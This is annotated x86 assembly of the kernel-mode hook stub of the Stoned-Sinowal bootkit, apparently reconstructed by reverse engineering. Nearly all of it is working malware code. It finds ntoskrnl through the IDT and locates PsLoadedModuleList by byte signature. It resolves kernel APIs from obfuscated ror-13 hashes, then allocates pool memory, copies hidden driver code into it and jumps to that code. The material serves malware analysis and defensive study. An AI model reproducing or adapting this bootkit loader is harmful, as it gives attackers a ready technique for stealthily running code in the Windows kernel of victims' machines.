
;  Stoned-Sinowal Bootkit [Kernel Code]

;  reverse engineering done by Peter Kleissner and other people
;  ntoskrnl hook code, located at the end of the ntoskrnl.exe image


Kernel_Code:

; store register contents
pushad
pushfd
cld


; set ds/es/ss back again to valid Data Segment Selectors
xor eax,eax                                                                     ; start with zero descriptor

Segmentation_Check_loop:
lsl ebx,ax                                                                      ; load segment limit into ebx
jnz Next_Segment_Selector                                                       ; if invalid or cannot be accessed ZF = 0, next segment selector
inc ebx                                                                         ; +1 to get real value (normaly 0FFFFFFFFh)
jnz Next_Segment_Selector                                                       ; => if not max. (4 GB), next segment selector   (FFF..FF+1 = 0, so zero flag set if max.)

lar ebx,ax                                                                      ; load access rights into ebx
and bh,11111010b                                                                ; mask out following bits: Present, DPL, System, Type [Data/Code, Write]
cmp bh,10010010b                                                                ; present? system? data? write access?
je Found_Data_Segment_Selector                                                  ;   => if yes found our Segment Selector to set

Next_Segment_Selector:
sub ax,00001000b                                                                ; next segment selector
jnz Segmentation_Check_loop                                                     ; try next if not already the last one

Found_Data_Segment_Selector:

;or ax,ax
;jnz Found_Data_Segment_Selector_Valid
;;mov ax,ss    <- does not work under VirtualBox
;mov ax,10h
;
;Found_Data_Segment_Selector_Valid:

; set data segment registers to data segment selectors  [usually segment selector 10h on Windows systems, which is usually ss]
mov es,ax
mov ds,ax
;mov ss,ax  ; <- ss must be same CPL as CS (!), crashes under VirtualBox
CPU 486     ; for the wbinvd instruction
wbinvd

; ebp Analysis:
;   ebp = original esp after all operations
;   [ebp - 4]    ZwReadFile
;   [ebp - 8]    ZwCreateFile
;   [ebp - 12]   ZwClose
;   [ebp - 16]   KeLoaderBlock
;   [ebp - 20]   ExFrePool
;   [ebp - 24]   ExAllocatePool
;   [ebp - 28]   PsLoadedModuleList
;   esp points here (esp = ebp)
;   [esp]        pointer to data below
;   ...
sub esp,byte 34                                                                 ; create data frame on stack (later used with ebp)



; let's get PsLoadedModuleList
;  1. get IDT base
;  2. get address of Division by Zero (Interrupt 0) Exception Handler
;  3. scan memory for PE image, should be ntoskrnl then
;  4. scan code of ntoskrnl for a signature and extract PsLoadedModuleList pointer

; store IDTR on stack
sidt [ds:esp]                                                                      ; store IDT Register on stack (32 bit address, 16 bit limit)
pop bx                                                                          ; 16 bit IDT limit
pop ebx                                                                         ; 32 bit IDT address
mov ebp,esp                                                                     ; = original esp - 32, = 1 PsLoadedModuleList, 6 imports, (6 bytes IDTR just popped from stack)

; get address of Interrupt 0 Handler
mov eax,[ebx+0x4]                                                               ; Offset 16..31  [Interrupt Gate Descriptor]
mov ax,[ebx]                                                                    ; Offset 0..15   [Interrupt Gate Descriptor]
and eax,0xFFFFF000                                                              ; page base address
xchg eax,ebx                                                                    ; store address in ebx

; scan memory of Exception Handler for a PE Image -> this will resolve a pointer to ntoskrnl
Find_Exception_Handler_PE_Image:
sub ebx,4096                                                                    ; next page to check (PE images are always page aligned)
cmp word [ebx],'MZ'                                                             ; DOS Header found?
jnz Find_Exception_Handler_PE_Image
mov eax,[ebx+0x3c]                                                              ; get address of PE Header (skip DOS Header/Stub)
cmp eax,2 * 4096                                                                ; check range (PE Header must be within 8192 bytes)
jnc Find_Exception_Handler_PE_Image
cmp dword [ebx+eax],'PE'
jnz Find_Exception_Handler_PE_Image

; obfuscation call
;   [esp] contains then pointer to data
;         has been seen in previous Sinowal version for getting PhysicalDrive string
call dword Obfuscation_Call


; standard API hashes (all of ntoskrnl)
; [ebp - 28]   PsLoadedModuleList
ExAllocatePool    dd    03707E062h  ; ebp-24
ExFrePool         dd    09D489D1Fh  ; ebp-20
KeLoaderBlock     dd    03E7DC5A8h  ; ebp-16 (unused)
ZwClose           dd    0DCD44C5Fh  ; ebp-12
ZwCreateFile      dd    003888F9Dh  ; ebp-8
ZwReadFile        dd    084FCD516h  ; ebp-4
                  dd    000000000h  ;                       ; hash zero terminator (no more hash following)


; here execution flow goes on..
Obfuscation_Call:

; get absolute address of PE Image the exception handler exists in, to scan it
lea edx,[ebx+eax]                                                               ; edx = absolute address of PE Header
mov ecx,[edx+0x50]                                                              ; SizeOfImage
mov edi,ebx                                                                     ; edi = address of PE image (of DOS header)

; scan Exception Handler PE Image for  0D  24 F8 81 FB / 83 E0 F8 81
;                                         Windows XP SP3:
;   0D                                    0D
;   24 F8		        AND AL,F8             83 E0 F8	      XOR EAX, FFFFFFF8
;   81 FB ????????  CMP EBX, dwordX       81 xx ????????  XOR DWORD PTR[xx], dwordX
; ..dwordX points to PsLoadedModuleList
mov al,0Dh
Scan_Exception_PE_Image_PsLoadedModuleList:
repne scasb
jnz Image_Parsing_done                                                          ; if not found exit loop
cmp dword [edi],0xfb81F824
jz Found_Signature
cmp dword [edi],0x81f8e083
jnz Scan_Exception_PE_Image_PsLoadedModuleList
inc edi                                                                         ; next byte to check

Found_Signature:                                                                ; found the code signature, extract PsLoadedModuleList
mov eax,[edi+0x4]                                                               ; store PsLoadedModuleList pointer in eax 

Image_Parsing_done:


; use Export Table of the PE Image to resolve the hashes
mov edx,[edx+0x78]                                                              ; -> Export Table.Virtual Address
add edx,ebx                                                                     ; ebx = pointer to DOS Header / image base  (absolute address)
xor ecx,ecx
dec ecx                                                                         ; ecx = -1 = 0FFFFFFFFh

; store the PsLoadedModuleList pointer on stack and resolve hashes
jmp short Resolve_Next_Hash_StoreOnStack



Next_Export:
;  ecx      export counter
;  ebx      still base of ntoskrnl image (points to DOS Header)
;  esi      Export Name
;  edi      Hash Value
;  [esp]    Pointer to Next Hash
;  ebp      Pointer to Stack Variables
inc ecx                                                                         ; next function to generate hash of (ecx = counter)
mov esi,[edx+0x20]                                                              ; Export Directory Table.Name Pointer RVA
add esi,ebx                                                                     ;  (absolute address)
mov esi,[esi+ecx*4]                                                             ; lookup the function name in the Name Pointer Table
add esi,ebx                                                                     ;  (absolute address)

xor eax,eax                                                                     ; will hold character (zero extended)
xor edi,edi                                                                     ; will hold hash value

Generate_Hash_of_Export_Name:
; generates the hash of the name string, += n >> 13 is used
lodsb
or al,al                                                                        ; zero termination?
jz Hash_Generated                                                               ; if yes => exit loop
ror edi,13                                                                      ; >> 13 is used (as in previous Sinowal version!)
add edi,eax                                                                     ; add to hash value
jmp short Generate_Hash_of_Export_Name

Hash_Generated:
; krrr
mov esi,[esp]                                                                   ; as discussed, [esp] contains pointer to hashes (because of the call)
lodsd                                                                           ; get next hash
or eax,eax                                                                      ; last hash?
jz All_Hashes_Resolved                                                          ; if yes exit loop
cmp edi,eax                                                                     ; found correct hash?
jnz Next_Export                                                                 ; if not => next export
mov [esp],esi                                                                   ; update hash pointer
mov edi,[edx+0x24]                                                              ; Export Directory Table.Ordinal Table RVA
add edi,ebx                                                                     ;   (absolute address)
movzx eax,word [edi+ecx*2]                                                      ; lookup in the Ordinal Table to get number in EAT
mov edi,[edx+0x1c]                                                              ; Export Directory Table.Export Address Table RVA
add edi,ebx                                                                     ;   (absolute address)
mov eax,[edi+eax*4]                                                             ; lookup the address
add eax,ebx                                                                     ; w00t! found the address, store in eax and store as stack variable!

Resolve_Next_Hash_StoreOnStack:
xchg edi,ebp                                                                    ; edi to point to stack variables
stosd                                                                           ; store eax to variable
xchg edi,ebp                                                                    ; ebp points now to next variable...!
jmp short Next_Export

All_Hashes_Resolved:



; here the loader ends, relocate the driver code; that code could be out sourced to save bootkit memory

; nt!ExAllocatePool(Type 0, 8192 bytes)
push dword 8192                                                                 ; NumberOfBytes = 8192 bytes
push dword 0                                                                    ; PoolType = 0
call dword [ebp - 24]                                                           ; ExAllocatePool()

or eax,eax                                                                      ; valid buffer?
jz Exit_Bootkit

mov edi,eax                                                                     ; copy the code
mov esi,[ebp - 32]                                                              ; the pointer to the import terminator
add esi,Driver_Code - Obfuscation_Call +4                                       ; use that absolute pointer (+ 4 to seek after the terminator)
mov ecx,Total_End_of_Binary - Driver_Code
rep movsb

; initialize the data pointer [ebp-32]
mov [ebp - 32],eax                                                              ; will point to the data
add [ebp - 32],dword Data_Reference - Driver_Code                               ; calculate address from absolute point

jmp eax



